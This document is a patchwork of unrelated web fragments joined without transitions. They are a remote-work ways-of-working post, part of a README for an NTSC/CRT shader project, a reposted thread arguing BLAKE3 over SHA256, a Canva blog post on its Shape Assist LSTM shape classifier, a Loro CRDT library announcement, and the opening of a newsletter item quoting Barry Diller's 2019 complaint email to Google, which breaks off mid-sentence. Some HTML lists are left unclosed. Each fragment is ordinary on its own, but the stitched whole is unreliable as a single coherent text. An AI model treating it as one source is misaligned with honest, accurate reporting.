<p>Automated daily screenshots of dashboards with team KPIs. Regular snapshots sent to teams’ Slack channels replaced the physical TVs from the physical office. These nudges provoked conversation,  increasing awareness of both the success of features, and production risks.&nbsp;</p>



<h3>Team Games</h3>



<p>Opportunities to relax and have fun together needed to be intentional. Web based multi-player remote games were a go-to for several teams.</p>



<h3>Virtual Whiteboarding</h3>



<p>Discussions and brainstorms sometimes worked even better than their in-person alternatives. Unlike physical whiteboards, in virtual space there’s no problems with everyone crowding around. Nobody can hog the view. Everyone can participate at once. Not to mention saving a fortune in post-it notes.&nbsp;</p>



<h3>Pair Programming&nbsp;</h3>



<p>Pair programming works well when remote. For many teams it works <em>better</em> remotely; their office environments being so hostile to in-person collaboration. No longer having to compete with the din, pairs could focus. </p>



<p>Communication bandwidth isn’t as high as in-person, but the tooling to work together remotely has come a long way. Tools like VSCode <a href="https://code.visualstudio.com/learn/collaboration/live-share">Live-share</a>, and <a href="https://tuple.app/">Tuple</a> make working together a breeze. Tooling like <a href="https://github.com/remotemobprogramming/mob">mob</a> enables fast handover.&nbsp;&nbsp;</p>



<h3>Continuous Integration</h3>



<p>True continuous integration (integrating to main multiple times per day) is even more valuable when you don’t have the opportunity to overhear what others are working on.</p>



<figure></figure>



<h2>Serendipity is not a Strategy</h2>



<p>All quadrants&nbsp;benefit from intentionally defining and writing down ways of working, rather than relying on accidental interactions and happenstance in an office.</p>



<p>Don’t rely on watercooler moments.</p>



<p>If you want folks to have unstructured conversations from which new ideas might emerge, create those opportunities intentionally. There are lots of mechanisms to increase luck and the chances of useful conversations occurring.&nbsp;e.g. No-pre-planned meeting days. Blocked lunch breaks. Group volunteering. Team meals. Quarterly Offsites. Retrospectives.&nbsp;</p>



<p>Look for what’s working for your team and turn it up. Try changing things and uncovering better ways of working!</p>

<li><strong>Shaders</strong>: All of the shader source files
<ul dir="auto">
<li>While the shader files' extension is <code>hlsl</code>, these shaders will compile as either HLSL or GLSL, due to some macros in <code>cathode-retro-util-language-helpers.hlsli</code>
<ul dir="auto">

<p dir="auto">Some things that are on the list to do at some point:</p>
<ul dir="auto">
<li>Add more preset NTSC timing data (for instance, get the timings for Sega Genesis games, so that emulators will get that classic rainbow-like waterfall effect in Sonic)</li>
<li>Add additional input types (not just RGB)
<ul dir="auto">
<li>The NES outputs in effectively 9-bit color (6 bits of color palette space plus 3 bits for "color emphasis"), and the signal can be generated direct from that</li>
<li>CGA cards had two different modes of generating a composite signal, and to truly get accurate colors for composite artifact color tricks that old PC games like Maniac Mansion used, the signal would have to be generated in the same way</li>
</ul>
</li>
<li>Add ability to decode a real NTSC signal - Rather than using the Generator shaders to create NTSC scanlines, it's absolutely possible to take a true NTSC signal, slice it up into scanlines, and then run it directly into the Decoder shaders
<ul dir="auto">
<li>This would likely require a resampler from whatever the input rate is into one where the color carrier frequency is a nice even value like 4 or 8 texels (the generator by default uses 4).</li>
<li>Additionally detecting the various different ways that devices generated their scanlines, both for standard interlaced signals and the "240p" modes that consoles tended to use.</li>
<li>This is code that I have half-working using the output of an oscilloscope that I can hook a console up to, but it's sort of hacked together at the moment.</li>
</ul>
</li>
<li>Integration into some existing emulators
<ul dir="auto">
<li>It's totally possible to get these into something like <a href="https://www.retroarch.com/" rel="nofollow">RetroArch</a>, but it's not <em>quite</em> as easy as just dropping the shaders in, requiring a little bit of redo on some of the shaders (one in particular is intended to run once for any given output screen resolution as it would be expensive to run every frame).</li>

    <p>This post is a copy of <a href="https://twitter.com/zooko/status/1652743779932045313">tweets</a> by <a href="https://en.wikipedia.org/wiki/Zooko_Wilcox-O%27Hearn">Zooko Wilcox-O'Hearn</a>.</p>
<p>SHA256 was designed by the NSA. BLAKE (the original) and BLAKE3 were designed by Jean-Philippe Aumasson and others (including me, but Jean-Philippe and the other contributors did a lot more of the cryptographic heavy lifting than I did).</p>
<p>SHA256 was based on SHA1 (which is weak). BLAKE was based on ChaCha20, which was based on Salsa20 (which are both strong).</p>
<p>NIST/NSA have repeatedly signaled lack of confidence in SHA256: first by hastily organising the SHA3 contest in the aftermath of Wang's break of SHA1, then by making "Don't be like SHA256" a goal for the algorithms of that contest, and then by banning SHA256 from new designs to be used by the USA government (except for in one specific cryptosystem that protects from weaknesses in the hash function <a href="https://media.defense.gov/2022/Sep/07/2003071836/-1/-1/0/CSI_CNSA_2.0_FAQ_.PDF">https://media.defense.gov/2022/Sep/07/2003071836/-1/-1/0/CSI_CNSA_2.0_FAQ_.PDF</a>).</p>
<p>BLAKE (the original) was very well-studied during the SHA3 competition. In NIST's final report on the SHA3 process, they stated that the depth of scientific analysis applied to BLAKE exceeded even that applied to Keccak (the final SHA3 winner).</p>

<p>Known, feasible attacks can break 31 out of 64 rounds of SHA256 (48% of the rounds). Known, feasible attacks can break only 2 out of 7 rounds of BLAKE3 (29% of the rounds).</p>
<p>BLAKE3 comes “out of the box” with security features that can protect users in common use cases, such as protection against length-extension attack, a standard method of keying, "personalization tags" to guarantee domain separation, etc.</p>
<p>BLAKE3 is <em>much</em> more efficient (in time and energy) than SHA256, like 14 <em>times</em> as efficient in typical use cases on typical platforms.</p>
<p><img src="https://peergos.org/theme/img/blog/blake3-performance.jpeg"></p>
<p>BLAKE3 also offers performance that is competitive against SHA256 in a lot of different use cases and platforms, including some that might surprise you, such as sometimes being more efficient than SHA256 <em>even</em> when your CPU comes with SHA256 acceleration circuits built into it!</p>
<p>BLAKE3 is highly parallelizable. This provides two performance advantages, only the first of which most people think about.</p>
<ul>
<li>
<p>The first is big data + big multicore: if the size of your data inputs scale up 100X but the number of CPU cores in your platform also scale up 100X, BLAKE3 takes only a little longer, but SHA256 takes approximately 100X times as long.</p>
</li>
<li>
<p>The other advantage, less widely understood, is that inside a single compute device, new tech improvements provide more and more parallel power. This is true in FPGAs and GPUs, and it is true in CPUs because of vectorization upgrades.</p>
</li>
</ul>
<p>AVX in Intel/AMD, Neon and Scalable Vector Extensions in Arm, and RISC-V Vector computing in RISC-V. BLAKE3 can take advantage of all of it.</p>
<p>When you upgrade to a newer CPU/platform/device, BLAKE3 typically <em>further extends</em> its performance advantage over SHA256 compared to the performance advantage it already had on the previous platform!</p>
<p>Finally, BLAKE3 was designed and implemented by both cryptographers <em>and</em> software engineers. The reference implementations are super efficient and well-engineered for security, thanks to Jack O'Connor, Samuel Neves, and Jean-Philippe Aumasson: <a href="https://github.com/BLAKE3-team/BLAKE3">https://github.com/BLAKE3-team/BLAKE3</a></p>

            <description><![CDATA[<p>URL: <a href="https://www.canva.dev/blog/engineering/ship-shape/">https://www.canva.dev/blog/engineering/ship-shape/</a>, See on <a href="https://news.ycombinator.com/item?id=38249214">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-page-content="true"><h2 id="introduction">Introduction</h2>
<p>Millions of Canva users worldwide have unleashed their creativity with our new <a target="_new" href="https://www.canva.com/draw/">Draw tool</a>,
which lets you add customized drawings to your design to make them stand out. However, if
you’re anything like us, even a simple straight line drawn with a mouse or a trackpad can end
up looking like a path trod by a tipsy squirrel. Don’t even get us started on circles and rectangles.
So when we set out to plan the draw tool, we knew we’d need to lend a hand to those of us lacking
surgeon levels of steadiness. So we built Shape Assist, which uses machine learning (ML) to turn a
shaky scribble into a sleek vector graphic (you can thank us later).</p>
<figure><span><span></span><img alt="A video showing Shape Assist in action" loading="lazy" width="2324" height="1310" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/shape_assist.1fd8459c.gif"><span></span></span><figcaption>Shape Assist in action</figcaption></figure>
<h2 id="design-considerations">Design considerations</h2>
<p>In developing the feature, we kept classification latency at the forefront of our minds. We wanted
to make sure the experience was snappy but still accurate. Therefore, we decided to deploy the solution
in the browser, which allows for real-time shape recognition and drawing assistance, providing a seamless
and interactive user experience. Users can draw shapes and receive immediate feedback without experiencing
delays associated with server-based processing. This enhances the overall usability and responsiveness of
the shape assist tool, making it more enjoyable and efficient for users.</p>
<p>Furthermore, running the shape assist ML model in the browser eliminates the need for continuous internet connectivity,
making it accessible even in offline scenarios. People can use the shape assist tool without depending on internet
connectivity, which can be especially useful in situations with limited or unreliable internet access.</p>
<p>In the initial development of Shape Assist in Canva, we used computer vision heuristics to identify and recognize
shapes drawn by users. We based these heuristics on pre-defined rules and thresholds to detect specific shapes, such as
rectangles, circles, and triangles, by analyzing geometric properties of the cartesian coordinates of the points. While
this approach provided some basic shape recognition capabilities, it had limitations when adding new shapes or handling
more complex shapes. While we had already decided to limit the initial implementation to shapes people could draw with
a single stroke, our proposed shape list included some that were too complex for our initial approach to handle (like
clouds, stars, and hearts).</p>
<p>To overcome these limitations and provide a more versatile and accurate shape recognition system, we decided to switch
to an ML model. ML models can learn from a large dataset of user-drawn shapes and can adapt and generalize to new
shapes, styles, and variations. This allowed us to expand the capabilities of shape assist beyond simple geometric
shapes to more complex and custom shapes, making it a more robust and flexible tool for users.</p>
<p>We designed the feature to replace the shape drawn by a user if they held down the cursor in place for at
least a second after drawing. However, we also wanted to be able to keep the shape as is, without automatic replacement,
if it didn't closely match any of the predefined classes.</p>
<p>Developing the ML model for Shape Assist involved several key steps. First, we collected a large dataset of user-drawn
shapes, capturing a wide range of styles and variations. Next, we used the heavily augmented dataset to train a neural
network, with preprocessing to handle user drawing style differences. Finally, we deployed the ML model in the browser
using customized inference code to minimize the bundle footprint. The result is a super snappy feature that accurately
identifies shapes drawn by different users.</p>
<h2 id="gathering-the-data">Gathering the data</h2>
<p>As all ML Engineers will know, the basis for a successful ML model is data, so we paid special attention
to collecting and curating our dataset. We wanted to make sure Shape Assist would be delightful to diverse users,
so we collected drawing data from anyone who agreed to sit still long enough to hold a mouse. We invited intrepid
Canvanauts to unleash their creative spirit and draw single-stroke shapes in a simple user interface. We recorded
the strokes made by users as a series of x and y coordinates, which allowed us to collect a diverse set of user-generated
data, with each shape represented as a sequence of coordinates.</p>
<p>Using coordinates to record the strokes provided us with the flexibility to preprocess the data and perform various
data augmentation techniques, further improving the model's ability to generalize. If the shapes were recorded as
binary images rather than x and y coordinates, then spatial augmentations such as flipping, rotating and shearing could
be applied. But by recording the data as coordinates we can also apply augmentations such as random deletion of
coordinates, random jittering of point location, reversal of point order, among others.</p>
<p>Canvanauts love a chance to get involved and help out other teams, so even just from volunteer efforts, we managed to
collect a sizeable dataset. However, we quickly learned that our engineers and designers aren’t very representative of
the average Canva user. For example, ML engineers have a penchant for providing adversarial data, and our designers are
so talented we could probably sell their doodles (we even instructed some to draw with their non-dominant hand to make
it fairer for the rest of us mere mortals). Thankfully, after providing some stricter guidelines and expectations,
we obtained a sizeable dataset.</p>
<h2 id="designing-and-training-the-model">Designing and training the model</h2>
<p>Since we wanted the ML model to run client-side, and we didn't want to have a detrimental impact on page load
time, we needed to keep the size of the model to a minimum. Therefore, instead of using a <a target="_new" href="https://cs231n.github.io/convolutional-networks/">Convolutional
Neural Network (CNN)</a> that required converting the
points into pixels, we decided to experiment with a <a target="_new" href="https://cs231n.github.io/rnn/">Recurrent Neural Network (RNN)</a>,
which directly used the strokes' x and y coordinates.</p>
<figure><span><span></span><img alt="Comparison of the Cartesian coordinate system versus pixels in varying resolutions" loading="lazy" width="2006" height="660" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/coordinate_systems.8c700172.png"><span></span></span><figcaption>To accurately represent the shape in pixels, we required approximately 20x20 pixels. This results in a
large, sparse image or vector (400 elements). However, using Cartesian
coordinates, we found we could use far fewer elements while still maintaining good performance.</figcaption></figure>
<p>To identify the optimal model attributes, we performed a hyperparameter sweep, tweaking various parameters such as
input size, number of layers, and number of features in the hidden state. We tried different combinations to find
the sweet spot for our Shape Assist model.</p>
<p>One challenge we encountered while developing the Shape Assist model was that different users draw at different
speeds. This resulted in varying lengths of the list of points describing a given shape, with more points in the
list for users who draw slowly than those who draw quickly. To ensure the model could generalize well to different
drawing speeds, we needed to fix the number of points representing each shape. While we could use piecewise linear
interpolation to evenly distribute points, we found this approach tended to remove key points, resulting in a loss of
important detail. Instead, we developed a variation on the <a target="_new" href="https://en.wikipedia.org/wiki/Ramer%E2%80%93Douglas%E2%80%93Peucker_algorithm">Ramer-Douglas-Peucker (RDP) algorithm</a>,
which is a curve simplification algorithm that reduces the number of points in a curve while preserving its important details.
It achieves this by recursively removing points that deviate insignificantly from the simplified version of the curve.</p>
<figure><span><span></span><img alt="Comparison of data points: from left to right, the original, simplified data points using linear interpolation
and RDP simplification" loading="lazy" width="1980" height="712" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/rdp.2a62e7e5.png"><span></span></span><figcaption>Original data points versus simplified data using
linear interpolation versus RDP simplification. RDP simplification maintains high-frequency
details (such as the sharp corner circled in the image), while linear interpolation can erase
these important details.</figcaption></figure>
<p>Adding to the complexity of training the model, we knew that we wanted the option of rejecting the model prediction
if the shape didn't closely resemble one of the predefined classes.</p>
<p>Given that only one shape could be correct at a time, a softmax activation function, combined with a
<a target="_new" href="https://en.wikipedia.org/wiki/Cross-entropy">cross-entropy</a> loss, was the obvious choice. We could reject the
prediction if the confidence associated with the highest-probability
class was below a given threshold. However, we found that this approach led to models with high confidence, even when
wrong. Therefore, we opted instead to train the model as a multi-class multi-label classifier, using sigmoid activation
functions on each output class, and rejecting the prediction if no classes were above a given threshold.</p>
<p><span><span></span><img alt="" loading="lazy" width="1972" height="936" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/softmax.dcc2311b.png"><span></span></span></p>
<figure><span><span></span><img alt="Illustration of why the softmax activation function is not used. Here the model is overly confident on circle, when it
is not." loading="lazy" width="2002" height="856" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/sigmoid.84da85b5.png"><span></span></span><figcaption>Using a softmax activation function results in an overly confident model
even when wrong. We achieved better performance with sigmoid activation functions for all classes
followed by thresholding.</figcaption></figure>
<h2 id="deployment-trade-offs">Deployment trade-offs</h2>
<p>Once we had decided on the appropriate architecture and carefully trained the model, it was time to put it in the
hands of our users. Often ML models are large and computationally intensive, so they live on powerful (expensive)
computers in the cloud.</p>
<p>As it turns out, our model is pretty small and contains only a few mathematical operations, which allowed us to
consider running all the processing inside the client application. With this approach, we eliminated the need for
a connection to the server - the feature works entirely offline. As a bonus, eliminating the round-trip time to the
server means that we recognize shapes almost instantaneously.</p>
<h2 id="model-architecture">Model architecture</h2>
<p>So, exactly how big is the model, and what operations does it do? Let’s draw it (with itself)!</p>
<figure><span><span></span><img alt="Model, which consists of an LSTM and a Gemm." loading="lazy" width="1942" height="808" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/model.11478cd7.png"><span></span></span><figcaption>The model architecture, drawn
with the help of Shape Assist.</figcaption></figure>
<p>From these beautifully polished rectangles and arrows, you can see that we arrived at a
structure consisting of a single Long Short Term Memory (LSTM) layer, followed by a General Matrix Multiply
(Gemm, also known as a Dense or Fully Connected layer).</p>
<p>This diagram shows some important configuration variables:</p>
<ul>
<li>Number of interpolated points: <code>P = 25</code></li>
<li>Hidden size: <code>H = 100</code></li>
<li>Number of predefined shapes: <code>N = 9</code></li>
</ul>
<p>Using these values, we can derive the total number of parameters:</p>
<ul>
<li>LSTM: <code>4H * 2 + 4H * H + 8H = 41,600</code></li>
<li>Gemm: <code>P * H * N + N = 22,509</code></li>
<li><strong>Total</strong>: <code>64,109</code></li>
</ul>
<p>With 4 bytes per parameter (IEEE754 32 bit floating point), the model is roughly 250 kilobytes in size, approximately
equivalent to a single uncompressed 360p 16:9 image. We can potentially bring this down even further by storing the
parameters at a lower precision.</p>
<p>To run the model on the client, we needed a way of performing the LSTM and Gemm operations. Instead of using a
general-purpose ML engine for this, we elected to build them from scratch directly in Typescript. While this approach
doesn't generalize well to more complex models, it did allow us to deliver this feature quickly while keeping our
options open for more sophisticated kinds of processing in the future. The resulting implementation is less than
300 lines long and runs in under 10 milliseconds on a modern laptop (about ten times faster than you can blink!).</p>
<h2 id="shape-replacement">Shape replacement</h2>
<p>After using the model to determine what shape a user drew, we used a template-matching approach to accurately
align the user-drawn path with a vector-graphic representation. This involves normalizing both the input shape and
template shape, trying 15° rotations of the template shape, computing the first and second moments of the input points
in the rotated coordinate space, and calculating dissimilarity between the input points and the template shape.
The rotation with the smallest dissimilarity is selected as the optimal angle.</p>
<figure><span><span></span><img alt="Illustrating the template matching approach. Here various rotations of clouds are shown: 0°, 15°, 45°. The optimal rotation was

The optimal rotation of this cloud shape was 15°.</figcaption></figure>
<h2 id="conclusion">Conclusion</h2>
<p>We’re super stoked to be able to share this feature with the world. We had a lot of fun building it,
and whether you’re an expert designer or a scribbler, we hope you enjoy the extra sparkle it can bring to your creations.</p>

<h2>Envisioning the Local-First Development Paradigm<a href="#envisioning-the-local-first-development-paradigm" id="envisioning-the-local-first-development-paradigm" aria-label="Permalink for this section"></a></h2>
<p>Distributed states are commonly found in numerous scenarios, such as multiplayer
games, multi-device document synchronization, and edge networks. These scenarios
require synchronization to achieve consistency, usually entailing elaborate design
and coding. For instance, considerations for network issues or concurrent write operations
are necessary. However, for a wide range of applications CRDTs can simplify the code significantly:</p>
<ul>
<li>CRDTs can automatically merge concurrent writes without conflicts.</li>
<li>Fewer abstractions. There's no need to design specific backend database schemas,
manually execute expected conflict merges, or implement interfaces to memory and memory to
persistent structure conversions.</li>
<li>Offline supports are right out of the box</li>
</ul>
<details><summary>What are CRDTs</summary></details>
<details><summary>When you can't use CRDTs</summary></details>
<p>Since the data resides locally, client applications can directly access and
manipulate local data, offering both speed and availability. Additionally,
due to CRDTs' nature, synchronization / real-time collaboration can be achieved without relying on
centralized servers (similar to Git, allowing migration to other platforms
without data loss). With performance improvements, CRDTs increasingly
replace traditional real-time collaboration solutions in various contexts.</p>
<p>This represents a new paradigm. Local-first not only empowers users with control over
their data, but also makes developers' lives easier.</p>
<p><img alt="Local-first" loading="lazy" width="1910" height="1204" decoding="async" data-nimg="1" srcset="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled.4966eea6.png&amp;w=1920&amp;q=75 1x, https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled.4966eea6.png&amp;w=3840&amp;q=75 2x" src="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled.4966eea6.png&amp;w=3840&amp;q=75"></p>
<p>The annual growth rate of the <em>"local-first"</em> star count in GitHub has reached 40%+.</p>
<h3>Integrating CRDTs with UI State Management<a href="#integrating-crdts-with-ui-state-management" id="integrating-crdts-with-ui-state-management" aria-label="Permalink for this section"></a></h3>
<p><img alt="Loro's rich text collaboration example" loading="lazy" width="1660" height="720" decoding="async" data-nimg="1" srcset="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Frichtext.62b5791f.gif&amp;w=1920&amp;q=75 1x, https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Frichtext.62b5791f.gif&amp;w=3840&amp;q=75 2x" src="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Frichtext.62b5791f.gif&amp;w=3840&amp;q=75"></p>
<p>Loro's rich text collaboration example</p>
<p>Since CRDTs enable conflict-free automatic merging, the challenge with using
CRDTs shifts to "how to express operations and states on CRDTs".</p>
<p>Front-end state management libraries often necessitate defining the retrieval of
<code dir="ltr">State</code> and the specification of <code dir="ltr">Actions</code>, as illustrated by this example from
Vue's state management tool, Pinia:</p>

<p>This paradigm and CRDTs are easily compatible: The state in the state management
libraries corresponds to CRDT types, and Action corresponds to a set of
CRDT operations.</p>
<p>Thus, implementing UI state management through CRDTs does not require users to
change their habits. It also has many advanced features:</p>
<ul>
<li>Make states automatically synchronizable / support real-time
collaboration.</li>
<li>Like Git, maintain a complete distributed editing history.</li>
<li>It can store an extensively large editing history with a low memory footprint
and a compact encoding size. Below is an example.</li>
</ul>

<h2>Introduction to Loro<a href="#introduction-to-loro" id="introduction-to-loro" aria-label="Permalink for this section"></a></h2>
<p>Loro is our CRDTs library, now open-sourced under a permissive license. We believe a
cooperative and friendly open-source community is key to creating outstanding
developer experiences.</p>
<p>We aim to make Loro simple to use, extensible, and maintain high performance.
The following is the latest status of Loro.</p>
<h3>CRDTs<a href="#crdts" id="crdts" aria-label="Permalink for this section"></a></h3>
<p>We have explored extensively, supporting a range of CRDT algorithms that have
yet to be widely used.</p>
<h4>OT-like CRDTs<a href="#ot-like-crdts" id="ot-like-crdts" aria-label="Permalink for this section"></a></h4>
<p>Our CRDTs library is built on the brilliant concept of OT-like CRDTs from Seph Gentle's
<a href="https://github.com/josephg/diamond-types" target="_blank" rel="noreferrer">Diamond-type<span> (opens in a new tab)</span></a>.
Seph Gentle is currently writing a paper on it, which is worth looking forward
to. Its notable features include reducing the cost of local operations, easier
historical data reclamation, and sometimes lower storage and memory overhead.
However, it relies on high-performance algorithms to apply remote operations.
This design has great potential and we are excited about its future.</p>
<details><summary>Brief Introduction to OT-like CRDT algorithms</summary></details>
<h4>Rich Text CRDTs<a href="#rich-text-crdts" id="rich-text-crdts" aria-label="Permalink for this section"></a></h4>
<p>In May of this year, we open-sourced the
<a href="https://github.com/loro-dev/crdt-richtext" target="_blank" rel="noreferrer">crdt-richtext<span> (opens in a new tab)</span></a> project, integrating
the algorithms of the rich text CRDT <a href="https://www.inkandswitch.com/peritext/" target="_blank" rel="noreferrer">Peritext by Ink&amp;Switch<span> (opens in a new tab)</span></a> and
the sequance CRDT <a href="https://arxiv.org/abs/2305.00583" target="_blank" rel="noreferrer">Fugue by Matthew Weidner<span> (opens in a new tab)</span></a>.
A brief introduction to these two algorithms can be found in
<a href="https://www.notion.so/crdt-richtext-Rust-implementation-of-Peritext-and-Fugue-c49ef2a411c0404196170ac8daf066c0?pvs=21" target="_blank" rel="noreferrer">our blog at the time<span> (opens in a new tab)</span></a>.</p>
<p>Based on our experience from previous projects, we have integrated a rich text
CRDT and Fugue into our framework in the current Loro. However, the biggest
challenge was that <a href="https://github.com/inkandswitch/peritext/issues/31" target="_blank" rel="noreferrer">Peritext did not integrate well with OT-like
CRDTs<span> (opens in a new tab)</span></a>. We have recently
overcome this issue. We developed a new rich text CRDT algorithm that can run on
OT-like CRDTs and has passed the capabilities listed in the Peritext paper's
Criteria for rich text CRDTs, with no new issues revealed in our current million
fuzzing tests. We will write an article in the future specifically to introduce this
algorithm.</p>
<h4>Movable Tree<a href="#movable-tree" id="movable-tree" aria-label="Permalink for this section"></a></h4>
<p>We have also supported a movable tree CRDT. Synchronizing tree movements is often
complex due to the potential for circular references. Addressing this issue
in the distributed environment is even more challenging.</p>
<p>We implemented Martin Kleppmann's paper, <a href="https://ieeexplore.ieee.org/document/9563274/" target="_blank" rel="noreferrer"><em>A Highly-Available Move Operation for
Replicated Trees</em><span> (opens in a new tab)</span></a>. The idea
of this algorithm is to sort all move operations, ensuring the ordering is consistent
across the replicas. Then, each operation is applied sequentially.
If an operation would cause a circular reference, it has no effect.</p>
<p>We found it to be elegant in design and also performant.
The time complexity of local operations is O(k) (k being the average tree depth, as circular
reference detection is required). For applying remote operations, which entails
inserting new operations into the sorted list, we must undo operations that are
subsequent in the ordering, apply the remote operation, and then redo the undone
operations, with a cost of O(km) (m being the number of operations to undo).</p>
<p><img alt="Untitled" loading="lazy" width="1440" height="810" decoding="async" data-nimg="1" srcset="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%201.213bb232.gif&amp;w=1920&amp;q=75 1x, https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%201.213bb232.gif&amp;w=3840&amp;q=75 2x" src="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%201.213bb232.gif&amp;w=3840&amp;q=75"></p>
<p>Visualization of applying a remote op</p>
<p>Our tests show that local operations involving ten thousand random movements
among a thousand nodes take less than 10ms (tested on an M2 MAX chip). Moreover,
the cost of merging remote operations in this algorithm is similar to applying
remote operations in OT-like CRDTs, making it adoptable. We've also
experimented with
<a href="https://madebyevan.com/algos/log-spaced-snapshots/" target="_blank" rel="noreferrer">log-spaced snapshots<span> (opens in a new tab)</span></a> and
immutable data structure approaches in our
<a href="https://github.com/loro-dev/movable-tree" target="_blank" rel="noreferrer">movable-tree project<span> (opens in a new tab)</span></a>, concluding
that the undo + redo method is the fastest and the most memory-efficient.</p>
<h3>Data Structures<a href="#data-structures" id="data-structures" aria-label="Permalink for this section"></a></h3>
<p>Designing and experimenting with data structures is routine in Loro's
development process.</p>
<p>We previously open-sourced
<a href="https://github.com/loro-dev/generic-btree" target="_blank" rel="noreferrer">generic-btree<span> (opens in a new tab)</span></a> and have redesigned
its structure for a more compact memory layout and cache-friendliness. Besides
its remarkable performance, its flexibility enables us to support various
information types required for Text, like utf16/Unicode code points/utf8, with
minimal code. We also extensively reuse it to fulfill various requirements,
highlighting Rust's impressive type expression capabilities.</p>
<p>Internally, we've
<a href="https://www.loro.dev/docs/advanced/doc_state_and_oplog" target="_blank" rel="noreferrer">separated the document's state from its history<span> (opens in a new tab)</span></a>.
The state represents the current form of the document, akin to Git's HEAD
pointer, while the document's history resembles the complete operation history
behind Git. Hence, multiple document states can correspond to the same history.
This structure simplifies our code and facilitates future support for version
control.</p>
<p>Most of our optimizations thus far have focused on text manipulations, historically
one of the thorniest problems in CRDTs. In the future, we plan optimizations for a
wider range of real-world scenarios.</p>
<h3>The Future<a href="#the-future" id="the-future" aria-label="Permalink for this section"></a></h3>
<p><img alt="Untitled" loading="lazy" width="1630" height="1638" decoding="async" data-nimg="1" srcset="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%202.bc755aa8.png&amp;w=1920&amp;q=75 1x, https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%202.bc755aa8.png&amp;w=3840&amp;q=75 2x" src="https://www.loro.dev/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FUntitled%202.bc755aa8.png&amp;w=3840&amp;q=75"></p>
<p>We aim to reach version 1.0 by mid-next year, with much work to complete.</p>
<p>Given our limited workforce, we will first provide a WASM interface
for web developers to experiment with. Optimizing the WASM size is one of our
goals for this phase. Much of our design work is still ongoing, and we plan to
stabilize it in the next quarter, aiming for a simple yet powerful and flexible
API. We welcome ideas and suggestions in our <a href="https://discord.gg/tUsBSVfqzf" target="_blank" rel="noreferrer">community discussions<span> (opens in a new tab)</span></a>.</p>
<p>There's also extensive documentation work to make working with Loro enjoyable.
A potential indicator of success would be GPT generating sufficiently good code
based on our documentation.</p>
<p>Developing tools for developers is a challenging and exciting task.
Many developer tools and visualization methods in front-end development are
exceptionally good, and we hope to bring such experiences into the world of CRDTs and
local-first development. DevTools will reveal CRDTs' hidden states and simplify control,
making state maintenance and debugging a breeze.</p>
<p>We also plan to support richer CRDT semantics, including Movable Lists and global
undo/redo operations to support more diverse application scenarios.</p>

<div id="readability-page-1" class="page"><div dir="auto"><p><em>Welcome to Internal Tech Emails: internal tech industry emails that surface in public records. 🔍 If you haven’t signed up, join 36,000+ others and get the newsletter:</em></p><p><strong>From:</strong><span> Barry Diller</span><br><strong>Date:</strong><span> Thu, Dec 12, 2019, 6:41 PM</span><br><strong>Subject:</strong><span> Google/IAC/Expedia</span><br><strong>To:</strong><span> Philipp Schindler</span><br><strong>Cc:</strong><span> [REDACTED]</span></p><p>Dear Philipp,</p><p>I do appreciate your writing and offering to help Expedia during its difficulties. You will forgive me for being direct, but I will tell you that I found it more than ironic since much of Expedia's trouble is due to an increasingly aggressive Google. I've said in the past that I've been both a supporter and I believe friend to Google and its senior management through all these years, but I must say I'm on the edge of revolt now that Google's actions are so punitive, not just for Expedia, but also for IAC and all the players that depend upon something of a level playing field. Google's policy of constantly shrinking free search in favor of their own ad products and other disintermediating policies is harsh and hurtful to those who depend upon a fair marketplace.</p><p>I want to share some items that in the last days have come across my desk and starkly show how difficult it is to function under Google's rule. First, directly below, is a chart showing the payments one of our subsidiaries, VRBO Travel, has made to Google. From 2015 to 2019, five years, VRBO has received the same amount of visits, some 500m, from Google, the visits never much from changing year to year, yet the money VRBO has paid Google has doubled every year, going from $21M to almost $300M over those five years. Incredible, no? Seems to me a pretty devastating example of Google essentially squeezing out all the profits from a Company that has spent a huge amount to organize information and create an efficient marketplace on vacation properties for the benefit of consumers.</p><p>What could possibly justify such increases – it's not as if you're selling sugar against a world drought. The only conclusion is that Google has systematically moved every lever in its hegemony over search to disembowel our businesses.</p><p>Second, pasted below the VRBO data, is an email from Joey Levin who is responding to my asking him if there's any point to having direct discussions with Google.</p><p>Philipp, I'm the senior executive of companies that spend over 6.5 Billion dollars a year in media, the majority going to Google. I have a life of competing, and have never asked for special treatment or asked anyone to shield us from the rough and tumble of commerce. We are not owners of horses begging for automobile manufacturers to keep us alive as technology replaces us. We are vibrant innovative enterprises that deliver value for consumers and I believe you are unfairly using your monopoly power to bleed us dry. And, I believe I'm qualified to speak to this matter – our companies have paid Google ten billion dollars over the last years.</p><p>This is strong language and it isn't being sent for legal positioning or anything other than a plea for fair treatment of services that benefit consumers. It really grieves me to write this – I feel I was there at the beginning of Google's ascent, cheering it along in its early years, befriending the founders and introducing them to the concept of dual class stock as well as connecting them to Ron Olsen, who became their personal lawyer. But I can't continue to go silent almost every day now believing Google has become an existential threat to all our businesses without petitioning you and management to alter the course.</p><div><p><span>If you want to really talk about that, rather than the historically empty slogans of partnership, please tell me and I'll show up anytime 24/7.</span></p><p><strong>From:</strong><span> Joey Levin</span><br><strong>Sent:</strong><span> Saturday, November 2, 2019 11:10 AM</span><br><strong>To:</strong><span> Barry Diller</span><br><strong>Cc:</strong><span> OC</span><br><strong>Subject:</strong><span> RE: Re:</span></p></div><div><p><span>I'm not sure what there is to discuss. We have been spending and continue to spend billions of dollars with Google (whether EXPE or IAC), and it's a 